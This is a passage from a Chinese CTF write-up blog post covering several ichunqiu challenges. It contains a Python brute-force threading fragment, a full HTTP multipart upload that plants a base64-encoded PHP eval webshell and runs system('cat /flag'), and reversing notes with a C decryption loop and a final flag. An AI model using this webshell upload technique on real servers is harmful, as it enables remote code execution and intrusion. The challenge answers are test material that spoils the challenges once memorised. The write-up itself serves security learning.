threads.append(threading.Thread(target=send,args=(num,)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line"></span><br><span class="line">        thread.start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (len(threading.enumerate()) &lt; threadNumber):</span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">    crack()</span><br><span class="line"></span><br><span class="line"><span class="comment"># send(111)</span></span><br></pre></td></tr></table></figure>
+<p>payload :</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 1f59ccd88b9d491db1b14abc6ff8642bbb50265d149e41f1.game.ichunqiu.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:62.0) Gecko/20100101 Firefox/62.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://web3.shb.5am3/</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------21022237801674110016436295918</span><br><span class="line">Content-Length: 1107</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------21022237801674110016436295918</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;5am3.php&quot;</span><br><span class="line">Content-Type: text/php</span><br><span class="line"></span><br><span class="line">@&lt;?php </span><br><span class="line">$file = &apos;config.php&apos;;</span><br><span class="line">$code = base64_decode(&apos;QDw/cGhwCiAgICBpZihtZDUoJF9QT1NUWydwYXNzJ10pPT0iNGViZDM5N2QzZWU2NmMyMTBlM2RjNWYzYWNmOGQ5YzMiKSBldmFsKCRfUE9TVFsna24wY2snXSk7Cj8+CiAgICAgICAgICAgIAogICAg&apos;);</span><br><span class="line">file_put_contents($file, $code);</span><br><span class="line">?&gt;</span><br><span class="line">-----------------------------21022237801674110016436295918</span><br><span class="line">Content-Disposition: form-data; name=&quot;file[1]&quot;</span><br><span class="line"></span><br><span class="line">sssss.asd</span><br><span class="line">-----------------------------21022237801674110016436295918</span><br><span class="line">Content-Disposition: form-data; name=&quot;file[]&quot;</span><br><span class="line"></span><br><span class="line">php</span><br><span class="line">-----------------------------21022237801674110016436295918</span><br><span class="line">Content-Disposition: form-data; name=&quot;hehe&quot;</span><br><span class="line"></span><br><span class="line">/var/sandbox/2765d621af8a58b78b4d528bd5ef7f6b/config.php</span><br><span class="line">-----------------------------21022237801674110016436295918</span><br><span class="line">Content-Disposition: form-data; name=&quot;pass&quot;</span><br><span class="line"></span><br><span class="line">5am3</span><br><span class="line">-----------------------------21022237801674110016436295918</span><br><span class="line">Content-Disposition: form-data; name=&quot;kn0ck&quot;</span><br><span class="line"></span><br><span class="line">system(&quot;cat /flag&quot;);</span><br><span class="line">-----------------------------21022237801674110016436295918--</span><br></pre></td></tr></table></figure>
+<h1 id="MISC-easy-py"><a href="#MISC-easy-py" class="headerlink" title="MISC-easy py"></a>MISC-easy py</h1><p>可以通过010 editor来分析pyc文件结构，然后让其生成CSV文件，简单排版后根据010自动检测出的变量列表填入Value，并推测其实际的python代码。并且推测程序加密逻辑，进而写出解密程序。</p>
+<p><img src="http://img.5am3.com/img/181104/kAE751Fcd4.png" alt="mark"></p>
+<p><img src="http://img.5am3.com/img/181104/lhL8fkImIH.png" alt="mark"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> cmp[<span class="number">15</span>]=&#123;&#125;;</span><br><span class="line"><span class="keyword">int</span> q=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">15</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">255</span>;j++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(cmp[q] == ((~j)&amp;<span class="number">102</span>)|(j&amp;(<span class="number">-103</span>)))</span><br><span class="line">		&#123;</span><br><span class="line">			q=q+<span class="number">1</span>;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;(<span class="keyword">char</span>)j;</span><br><span class="line">			<span class="keyword">break</span>;		</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以写出解密脚本</p>
+<h1 id="cpp"><a href="#cpp" class="headerlink" title="cpp"></a>cpp</h1><p>根据逆向发现flag经过两层加密，因为运算量较小，可直接通过爆破法直接求解  </p>
+<p><img src="http://img.5am3.com/img/181104/9kDhhLk9b3.png?imageslim" alt="mark"></p>
+<p>最终 flag{W0w_y0u_m4st3r_C_p1us_p1us}  </p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/WP/" rel="tag"># WP</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/10/30/Ad Hoc模式无线局域网/" rel="next" title="记一次Ad Hoc模式无线局域网搭建">
+                <i class="fa fa-chevron-left"></i> 记一次Ad Hoc模式无线局域网搭建
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/blog-logo.png"
+                alt="句末" />
+            
+              <p class="site-author-name" itemprop="name">句末</p>
+              <p class="site-description motion-element" itemprop="description">会划水和摸鱼的皮皮怪</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-1"><span class="nav-number">1.</span> <span class="nav-text">WEB-1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web-2"><span class="nav-number">2.</span> <span class="nav-text">web-2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web-3"><span class="nav-number">3.</span> <span class="nav-text">web-3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC-easy-py"><span class="nav-number">4.</span> <span class="nav-text">MISC-easy py</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#cpp"><span class="nav-number">5.</span> <span class="nav-text">cpp</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">句末</span>
+
+  
+</div>
+-->
+<div class="powered-by">
+<i class="fa fa-user-md"></i>
+
+
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
+<script type="text/javascript" src="/js/src/love.js"></script>
